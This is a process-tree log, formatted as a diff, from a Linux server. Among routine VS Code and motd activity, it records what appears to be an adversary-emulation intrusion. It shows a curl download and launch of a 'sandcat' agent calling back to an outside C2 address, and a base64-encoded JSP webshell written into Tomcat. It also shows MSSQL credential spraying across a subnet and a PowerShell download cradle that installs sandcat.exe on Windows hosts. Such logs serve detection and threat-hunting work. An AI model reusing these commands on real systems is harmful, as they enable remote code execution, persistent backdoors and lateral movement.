@@ -1,0 +1,556 @@
+sh (PID 295050): "sh -c which ps"  [x38]
+  └─ which (PID 295051): "which /usr/bin/which ps"  [x38]
+sh (PID 295052): "sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command="  [x38]
+  └─ ps (PID 295053): "ps -ax -o pid=,ppid=,pcpu=,pmem=,command="  [x38]
+sh (PID 295054): "sh -c "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh" 294687 294943 295048 294944 295049"  [x20]
+  └─ cpuUsage.sh (PID 295055): "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 294687 294943 295048 294944 295049"  [x20]
+    └─ sed (PID 295056): "sed -n s/^cpu\s//p /proc/stat"  [x75]
+    └─ cat (PID 295057): "cat /proc/294687/stat"  [x254]
+    └─ sleep (PID 295062): "sleep 1"  [x38]
+top (PID 295074): "top"  [x4]
+sh (PID 295131): "sh -c "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh" 294687 294943 295048 295125 294944 295049"
+  └─ cpuUsage.sh (PID 295132): "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 294687 294943 295048 295125 294944 295049"
+ls (PID 295202): "ls --color=auto -alF -h"  [x10]
+sleep (PID 295300): "sleep 180"  [x5]
+bash (PID 295525): "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash"
+  └─ base64 (PID 295528): "base64 -d"  [x2]
+        wrote → /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.jsp
+  └─ bash (PID 295529): "bash"  [x7]
+        wrote → /tmp/sh-thd.BWVzyW
+        wrote → /tmp/sh-thd.DrOKIN
+    └─ whoami (PID 295530): "whoami"  [x6]
+    └─ ifconfig (PID 295531): "ifconfig"
+    └─ ping (PID 295533): "ping -c 1 10.67.200.200"
+    └─ arp (PID 295532): "arp -a"
+    └─ flock (PID 295715): "flock -u 99"  [x5]
+    └─ flock (PID 295716): "flock -xn 99"  [x5]
+    └─ rm (PID 295718): "rm -f /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/vscode-remote-lock.root.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247"  [x3]
+    └─ locale-check (PID 295912): "locale-check C.UTF-8"  [x4]
+    └─ mesg (PID 295914): "mesg n"  [x4]
+    └─ uname (PID 295915): "uname -rsv"  [x2]
+    └─ cat (PID 295919): "cat /etc/os-release"  [x2]
+    └─ grep (PID 295920): "grep -a -E ^ID="  [x2]
+    └─ sed (PID 295921): "sed s/^[Ii][Dd]=//g"  [x2]
+    └─ sed (PID 295922): "sed s/"//g"  [x2]
+    └─ uname (PID 295923): "uname -s"  [x2]
+    └─ ldconfig (PID 295926): "ldconfig /sbin/ldconfig -p"  [x2]
+    └─ grep (PID 295927): "grep libstdc++"  [x2]
+    └─ sed (PID 295928): "sed s/^.* => //i"  [x2]
+    └─ ldconfig.real (PID 295926): "ldconfig.real -p"  [x2]
+    └─ cat (PID 295930): "cat /lib/x86_64-linux-gnu/libstdc++.so.6"  [x2]
+    └─ grep (PID 295931): "grep -a -o -E GLIBCXX_[[:digit:]]+\.[[:digit:]]+\.([[:digit:]]+)?"  [x2]
+    └─ sed (PID 295932): "sed s/GLIBCXX_//gi"  [x2]
+    └─ ldd (PID 295934): "ldd /usr/bin/ldd --version"  [x2]
+    └─ head (PID 295935): "head -n1"  [x2]
+    └─ ls (PID 295940): "ls -1 -t /root/.vscode-server/bin"  [x2]
+    └─ tail (PID 295941): "tail -n +6"  [x2]
+    └─ cat (PID 295942): "cat /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.pid"  [x2]
+    └─ ps (PID 295944): "ps ax"  [x2]
+    └─ grep (PID 295945): "grep ^\s*294557\s"  [x2]
+    └─ grep (PID 295948): "grep /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh"  [x2]
+    └─ grep (PID 295949): "grep -v grep"  [x10]
+    └─ wc (PID 295950): "wc -l"  [x2]
+    └─ tr (PID 295951): "tr -d [:space:]"  [x2]
+    └─ printenv (PID 295952): "printenv"  [x2]
+    └─ sed (PID 295953): "sed s/^/    /"  [x2]
+    └─ date (PID 295955): "date +%s%N"  [x4]
+    └─ rm (PID 295956): "rm /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x2]
+    └─ touch (PID 295957): "touch /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x2]
+    └─ chmod (PID 295958): "chmod 0700 /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x2]
+    └─ server.sh (PID 295959): "server.sh sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh --start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x10]
+    └─ sh (PID 295959): "sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh --start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x2]
+      └─ dirname (PID 295965): "dirname /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/server.sh"  [x2]
+      └─ node (PID 295966): "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/server/main.js --start-server --host=127.0.0.1 --enable-remote-auto-shutdown --port=0 --connection-secret /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.token"  [x2]
+        └─ node (PID 296004): "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=ptyHost"  [x2]
+          └─ sh (PID 296053): "sh -c wget --version > /dev/null
+if [ $? -eq 0 ]
+then
+	wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header='Metadata:true' -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11
+else
+	curl --version > /dev/null
+	if [ $? -eq 0 ]
+	then
+		curl --connect-timeout 7 -s --header='Metadata:true' http://169.254.169.254/metadata/instance?api-version=2019-03-11
+	fi
+fi
+exit 0"  [x2]
+            └─ wget (PID 296055): "wget --version"  [x4]
+            └─ wget (PID 296056): "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata:true -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11"  [x2]
+          └─ sh (PID 296067): "sh -c wget --version > /dev/null
+if [ $? -eq 0 ]
+then
+	wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q  -O - http://169.254.169.254/latest/meta-data/instance-id
+else
+	curl --version > /dev/null
+	if [ $? -eq 0 ]
+	then
+		curl --connect-timeout 7 -s  http://169.254.169.254/latest/meta-data/instance-id
+	fi
+fi
+exit 0"  [x2]
+            └─ wget (PID 296070): "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q -O - http://169.254.169.254/latest/meta-data/instance-id"  [x2]
+          └─ sh (PID 296099): "sh -c "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh" 296059"  [x14]
+            └─ cpuUsage.sh (PID 296100): "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 296059"  [x14]
+          └─ sh (PID 296112): "sh -c "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh" 296059 296104"
+            └─ cpuUsage.sh (PID 296113): "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 296059 296104"
+        └─ bash (PID 296010): "bash -ilc '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p '"ca8f367fc32a" + JSON.stringify(process.env) + "ca8f367fc32a"'"
+          └─ groups (PID 296011): "groups"  [x4]
+          └─ lesspipe (PID 296015): "lesspipe /usr/bin/lesspipe"  [x4]
+            └─ basename (PID 296016): "basename /usr/bin/lesspipe"  [x4]
+            └─ dirname (PID 296018): "dirname /usr/bin/lesspipe"  [x4]
+          └─ dircolors (PID 296019): "dircolors -b"  [x4]
+        └─ node (PID 296010): "node -p "ca8f367fc32a" + JSON.stringify(process.env) + "ca8f367fc32a""
+        └─ node (PID 296031): "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=watcherServiceChokidar"  [x2]
+        └─ bash (PID 308439): "bash -ilc '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p '"1ae0255d3f68" + JSON.stringify(process.env) + "1ae0255d3f68"'"
+        └─ node (PID 308439): "node -p "1ae0255d3f68" + JSON.stringify(process.env) + "1ae0255d3f68""
+    └─ cat (PID 295961): "cat /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.log"  [x10]
+    └─ grep (PID 295962): "grep -a -E Extension host agent listening on .+"  [x8]
+    └─ sed (PID 295964): "sed s/Extension host agent listening on //"  [x8]
+    └─ sleep (PID 295967): "sleep .03"  [x4]
+    └─ grep (PID 295999): "grep -a -E Web UI available at"  [x2]
+    └─ grep (PID 296000): "grep -o -E tkn=[0-9a-f-]+"  [x2]
+    └─ grep (PID 296001): "grep -o -E [0-9a-f-]+"  [x2]
+sh (PID 295534): "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 "https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100""  [x21]
+  └─ curl (PID 295535): "curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100"  [x21]
+bash (PID 295536): "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &"
+  └─ curl (PID 295537): "curl -O http://124.223.85.207:8079/sandcat-linux"
+        connected to → 124.223.85.207:8079
+  └─ chmod (PID 295538): "chmod +x sandcat-linux"
+nohup (PID 295539): "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v"
+sandcat-linux (PID 295539): "sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v"
+  └─ sh (PID 295775): "sh -c echo start:454b7093-cc6e-484e-9c42-e222c6906204"
+  └─ sh (PID 295776): "sh -c pwd"
+  └─ sh (PID 295781): "sh -c echo end:454b7093-cc6e-484e-9c42-e222c6906204"
+sh (PID 295547): "sh -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46"
+sh (PID 295548): "sh -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &"
+  └─ lsof (PID 295549): "lsof -i:8080 -t"
+nohup (PID 295550): "nohup timeout 600 python -m SimpleHTTPServer 8079"  [x4]
+sh (PID 295551): "sh -c echo end:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46"
+timeout (PID 295550): "timeout 600 python -m SimpleHTTPServer 8079"  [x10]
+sh (PID 295553): "sh -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15"
+sh (PID 295554): "sh -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456"
+  └─ mkdir (PID 295555): "mkdir -p fscan"
+  └─ unzip (PID 295556): "unzip -o -d ./fscan fscan-main.zip"
+  └─ chmod (PID 295557): "chmod +x ./fscan/main"
+  └─ main (PID 295558): "main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456"
+bash (PID 295569): "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...[truncated, 1233 chars total]"
+sshd (PID 295573): "sshd -D -R"  [x54]
+  └─ sh (PID 295792): "sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"  [x2]
+    └─ env (PID 295794): "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d"  [x8]
+    └─ run-parts (PID 295794): "run-parts --lsbsysinit /etc/update-motd.d"  [x2]
+      └─ 00-header (PID 295799): "00-header /etc/update-motd.d/00-header"  [x2]
+        └─ uname (PID 295803): "uname -o"  [x3]
+        └─ uname (PID 295806): "uname -r"  [x3]
+        └─ uname (PID 295807): "uname -m"  [x6]
+      └─ 10-help-text (PID 295808): "10-help-text /etc/update-motd.d/10-help-text"  [x2]
+      └─ 50-landscape-sy (PID 295809): "50-landscape-sy /etc/update-motd.d/50-landscape-sysinfo"  [x2]
+        └─ grep (PID 295810): "grep -c ^processor /proc/cpuinfo"  [x2]
+        └─ bc (PID 295813): "bc"  [x2]
+        └─ cut (PID 295814): "cut -f1 -d   /proc/loadavg"  [x2]
+        └─ date (PID 295815): "date"  [x2]
+        └─ landscape-sysin (PID 295816): "landscape-sysin /usr/bin/landscape-sysinfo"  [x14]
+          └─ uname (PID 295817): "uname -p"  [x2]
+          └─ who (PID 295819): "who -q"  [x2]
+      └─ 50-motd-news (PID 295820): "50-motd-news /etc/update-motd.d/50-motd-news"  [x2]
+        └─ cat (PID 295821): "cat /var/cache/motd-news"  [x2]
+        └─ head (PID 295822): "head -n 10"  [x4]
+        └─ tr (PID 295823): "tr -d \000-\011\013\014\016-\037"  [x4]
+        └─ cut (PID 295824): "cut -c -80"  [x4]
+      └─ 85-fwupd (PID 295825): "85-fwupd /etc/update-motd.d/85-fwupd"  [x2]
+        └─ cat (PID 295826): "cat /run/motd.d/fwupd/85-fwupd"  [x2]
+      └─ 90-updates-avai (PID 295827): "90-updates-avai /etc/update-motd.d/90-updates-available"  [x2]
+        └─ cat (PID 295828): "cat /var/lib/update-notifier/updates-available"  [x2]
+        └─ find (PID 295829): "find /var/lib/update-notifier/updates-available -newermt now-7 days"  [x2]
+        └─ grep (PID 295830): "grep -q -m 1 ."  [x2]
+      └─ 91-release-upgr (PID 295831): "91-release-upgr /etc/update-motd.d/91-release-upgrade"  [x2]
+        └─ lsb_release (PID 295833): "lsb_release -Es /usr/bin/lsb_release -sd"  [x2]
+        └─ cut (PID 295834): "cut -d  -f4"  [x2]
+        └─ id (PID 295835): "id -u"  [x6]
+      └─ release-upgrade (PID 295831): "release-upgrade -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd"  [x2]
+        └─ date (PID 295836): "date +%s"  [x7]
+        └─ stat (PID 295837): "stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available"  [x2]
+        └─ expr (PID 295838): "expr 1648192153 + 86400"  [x2]
+      └─ 92-unattended-u (PID 295839): "92-unattended-u /etc/update-motd.d/92-unattended-upgrades"  [x2]
+      └─ update-motd-una (PID 295839): "update-motd-una /usr/share/unattended-upgrades/update-motd-unattended-upgrades"  [x2]
+      └─ 95-hwe-eol (PID 295840): "95-hwe-eol /etc/update-motd.d/95-hwe-eol"  [x2]
+      └─ update-motd-hwe (PID 295840): "update-motd-hwe -e /usr/lib/update-notifier/update-motd-hwe-eol"  [x2]
+        └─ systemd-detect- (PID 295841): "systemd-detect- -q -c"  [x2]
+        └─ apt-config (PID 295842): "apt-config shell StateDir Dir::State"  [x3]
+          └─ dpkg (PID 295843): "dpkg --print-foreign-architectures"  [x78]
+        └─ apt-config (PID 295844): "apt-config shell ListDir Dir::State::Lists"  [x3]
+        └─ apt-config (PID 295846): "apt-config shell DpkgStatus Dir::State::status"  [x3]
+        └─ apt-config (PID 295848): "apt-config shell EtcDir Dir::Etc"  [x3]
+        └─ apt-config (PID 295850): "apt-config shell SourceList Dir::Etc::sourcelist"  [x3]
+        └─ find (PID 295852): "find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit"  [x2]
+        └─ dirname (PID 295855): "dirname /var/lib/update-notifier/hwe-eol"  [x2]
+        └─ mktemp (PID 295854): "mktemp -p /var/lib/update-notifier"  [x3]
+        └─ cat (PID 295856): "cat /var/lib/update-notifier/hwe-eol"  [x2]
+        └─ rm (PID 295857): "rm -f /var/lib/update-notifier/tmp.PxaXkVSs9i"
+        └─ rm (PID 308286): "rm -f /var/lib/update-notifier/tmp.oBfSHubtlg"
+      └─ 97-overlayroot (PID 295858): "97-overlayroot /etc/update-motd.d/97-overlayroot"  [x2]
+        └─ egrep (PID 295860): "egrep /usr/bin/egrep overlayroot|/media/root-ro|/media/root-rw /proc/mounts"  [x8]
+        └─ sort (PID 295861): "sort -r"  [x2]
+        └─ grep (PID 295860): "grep -E overlayroot|/media/root-ro|/media/root-rw /proc/mounts"  [x2]
+      └─ 98-fsck-at-rebo (PID 295862): "98-fsck-at-rebo /etc/update-motd.d/98-fsck-at-reboot"  [x2]
+      └─ update-motd-fsc (PID 295862): "update-motd-fsc /usr/lib/update-notifier/update-motd-fsck-at-reboot"  [x2]
+        └─ stat (PID 295864): "stat -c %Y /var/lib/update-notifier/fsck-at-reboot"  [x2]
+        └─ awk (PID 295866): "awk {print $1} /proc/uptime"  [x2]
+        └─ date (PID 295865): "date -d now - 2152994.74 seconds +%s"
+        └─ mount (PID 295869): "mount"  [x2]
+        └─ awk (PID 295870): "awk $5 ~ /^ext(2|3|4)$/ { print $1 }"  [x2]
+        └─ dumpe2fs (PID 295871): "dumpe2fs -h /dev/vda1"  [x2]
+        └─ grep (PID 295874): "grep ^Mount count:"  [x4]
+        └─ cut (PID 295875): "cut -d: -f 2-"  [x16]
+        └─ grep (PID 295878): "grep ^Maximum mount count:"  [x4]
+        └─ grep (PID 295882): "grep ^Check interval:"  [x4]
+        └─ cut (PID 295884): "cut -d( -f 1"  [x4]
+        └─ grep (PID 295887): "grep ^Next check after:"  [x4]
+        └─ date (PID 295889): "date -d  +%s"  [x4]
+        └─ dumpe2fs (PID 295890): "dumpe2fs -h /dev/vdb"  [x2]
+        └─ cat (PID 295909): "cat /var/lib/update-notifier/fsck-at-reboot"  [x2]
+        └─ date (PID 308294): "date -d now - 2443312.57 seconds +%s"
+      └─ 98-reboot-requi (PID 295910): "98-reboot-requi /etc/update-motd.d/98-reboot-required"  [x2]
+      └─ update-motd-reb (PID 295910): "update-motd-reb -e /usr/lib/update-notifier/update-motd-reboot-required"  [x2]
+bash (PID 295574): "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt"
+bash (PID 295575): "bash -c del /f /q c:\windows\logout.jsp"
+sh (PID 295576): "sh -c echo end:152d302e-4a34-48a4-b32b-16c0b3e73f15"
+sh (PID 295577): "sh -c echo start:1185e211-d897-42e4-bb2d-7260f0eba801"
+sh (PID 295578): "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami"  [x2]
+  └─ sqltool_amd64_u (PID 295579): "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --enable"  [x2]
+sh (PID 295585): "sh -c rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/webapps/ROOT/logout.jsp -r"  [x5]
+  └─ rm (PID 295586): "rm ./sqltool_amd64_upx"  [x5]
+  └─ rm (PID 295587): "rm /tmp/sandcat-linux -r"  [x5]
+  └─ rm (PID 295588): "rm"  [x5]
+sh (PID 295589): "sh -c echo end:1185e211-d897-42e4-bb2d-7260f0eba801"
+http-nio-80-exe (PID 295590): "http-nio-80-exe -Djava.util.logging.config.file=/usr/tomcat/apache-tomcat-8.5.76/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/tomcat/apache-tomcat-8.5.76/bin/bootstrap.jar:/usr/tomcat/apache-tomcat-8.5.76/bin/tomcat-juli.jar -Dcatalina.base=/usr/tomcat/apache-tomcat-8.5.76 -Dcatalina.home=/usr/tomcat/apache-tomcat-8.5.76 -Djava.io.tmpdir=/usr/tomcat/apache-t...[truncated, 661 chars total]"  [x3]
+  └─ sh (PID 295590): "sh -c whoami"
+sh (PID 295592): "sh -c echo start:b3033461-3342-4b36-87af-780ffe63cd09"
+sh (PID 295603): "sh -c echo end:b3033461-3342-4b36-87af-780ffe63cd09"
+sh (PID 295604): "sh -c echo start:e147423c-b478-4291-8866-115c380e19a0"
+sh (PID 295605): "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami"  [x2]
+  └─ sqltool_amd64_u (PID 295606): "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --enable"  [x2]
+  └─ sqltool_amd64_u (PID 295611): "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec whoami"  [x2]
+sh (PID 295620): "sh -c echo end:e147423c-b478-4291-8866-115c380e19a0"
+sh (PID 295621): "sh -c echo start:3d4c5b71-9d0b-427b-9ddf-5bb208e30119"
+sh (PID 295638): "sh -c echo end:3d4c5b71-9d0b-427b-9ddf-5bb208e30119"
+sh (PID 295640): "sh -c    cd / && run-parts --report /etc/cron.hourly"  [x7]
+  └─ run-parts (PID 295641): "run-parts --report /etc/cron.hourly"  [x7]
+sh (PID 295642): "sh -c echo start:99765d80-531b-400d-a6e8-d3220a4c1d18"
+sh (PID 295643): "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\Users\Public\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\Users\Public\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252...[truncated, 637 chars total]"
+  └─ sqltool_amd64_u (PID 295644): "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\Users\Public\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\Users\Public\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server ht...[truncated, 625 chars total]"
+sh (PID 295649): "sh -c echo end:99765d80-531b-400d-a6e8-d3220a4c1d18"
+sh (PID 295650): "sh -c echo start:7435be5b-e9e8-44de-83b8-6141cbd01bea"
+sh (PID 295651): "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\Users\Public\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\Users\Public\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 ...[truncated, 636 chars total]"
+  └─ sqltool_amd64_u (PID 295652): "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\Users\Public\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\Users\Public\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server htt...[truncated, 624 chars total]"
+sh (PID 295719): "sh -c echo end:7435be5b-e9e8-44de-83b8-6141cbd01bea"
+bash (PID 295722): "bash -c if [[ -f /usr/bin/lsb_release ]];then /usr/bin/lsb_release -a | grep Description | awk -F : '{print $2}' | sed 's/^[ \t]*//g'; elif [[ -f /etc/system-release ]];then cat /etc/system-release | sed -n '1p'; else cat /etc/issue | sed -n '1p'; fi"  [x41]
+  └─ lsb_release (PID 295723): "lsb_release -Es /usr/bin/lsb_release -a"  [x164]
+    └─ dpkg-query (PID 295727): "dpkg-query -f ${Version} ${Provides}
+ -W lsb-core lsb-cxx lsb-graphics lsb-desktop lsb-languages lsb-multimedia lsb-printing lsb-security"  [x41]
+  └─ grep (PID 295724): "grep Description"  [x41]
+  └─ awk (PID 295725): "awk -F : {print $2}"  [x41]
+  └─ sed (PID 295726): "sed s/^[ \t]*//g"  [x41]
+sh (PID 307450): "sh -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:"  [x126]
+  └─ grep (PID 307452): "grep socket:"  [x126]
+  └─ ls (PID 307451): "ls -l /proc/1/fd/0 /proc/1/fd/1 /proc/1/fd/10 /proc/1/fd/11 /proc/1/fd/12 /proc/1/fd/13 /proc/1/fd/14 /proc/1/fd/15 /proc/1/fd/16 /proc/1/fd/17 /proc/1/fd/18 /proc/1/fd/19 /proc/1/fd/2 /proc/1/fd/20 /proc/1/fd/21 /proc/1/fd/22 /proc/1/fd/23 /proc/1/fd/24 /proc/1/fd/25 /proc/1/fd/26 /proc/1/fd/27 /proc/1/fd/28 /proc/1/fd/3 /proc/1/fd/31 /proc/1/fd/32 /proc/1/fd/34 /proc/1/fd/35 /proc/1/fd/36 /proc/1/fd/37 /proc/1/fd/38 /proc/1/fd/39 /proc/1/fd/4 /proc/1/fd/40 /proc/1/fd/41 /proc/1/fd/42 /proc/1/fd/43 /proc/1/fd/44 /proc/1/fd/45 /proc/1/fd/46 /proc/1/fd/47 /proc/1/fd/48 /proc/1/fd/5 /proc/1/fd/5...[truncated, 4095 chars total]"  [x99]
+  └─ ls (PID 307520): "ls -l /proc/1/fd/0 /proc/1/fd/1 /proc/1/fd/10 /proc/1/fd/11 /proc/1/fd/12 /proc/1/fd/13 /proc/1/fd/14 /proc/1/fd/15 /proc/1/fd/16 /proc/1/fd/17 /proc/1/fd/18 /proc/1/fd/19 /proc/1/fd/2 /proc/1/fd/20 /proc/1/fd/21 /proc/1/fd/22 /proc/1/fd/23 /proc/1/fd/24 /proc/1/fd/25 /proc/1/fd/26 /proc/1/fd/27 /proc/1/fd/28 /proc/1/fd/3 /proc/1/fd/31 /proc/1/fd/32 /proc/1/fd/34 /proc/1/fd/35 /proc/1/fd/36 /proc/1/fd/37 /proc/1/fd/38 /proc/1/fd/39 /proc/1/fd/4 /proc/1/fd/40 /proc/1/fd/41 /proc/1/fd/42 /proc/1/fd/43 /proc/1/fd/44 /proc/1/fd/45 /proc/1/fd/46 /proc/1/fd/47 /proc/1/fd/48 /proc/1/fd/5 /proc/1/fd/5...[truncated, 4095 chars total]"  [x11]
